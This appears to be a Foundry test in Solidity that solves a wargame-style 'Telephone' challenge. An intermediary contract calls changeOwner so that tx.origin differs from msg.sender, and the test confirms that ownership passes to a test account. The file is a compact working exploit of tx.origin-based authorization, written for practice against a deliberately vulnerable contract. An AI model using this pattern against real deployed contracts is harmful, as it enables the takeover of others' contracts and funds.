// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Telephone.sol";

contract MiddleMan {
    function attack(address telephone) public {
        Telephone(telephone).changeOwner(msg.sender);
    }
}

contract TelephoneTest is Test {
    Telephone instance;

    function setUp() public {
        instance = new Telephone();
    }

    function test() public {
        assertEq(instance.owner(), address(this));

        MiddleMan middleMan = new MiddleMan();

        address alice = makeAddr("alice");
        vm.startPrank(alice);
        middleMan.attack(address(instance));
        assertEq(instance.owner(), alice);
    }
}
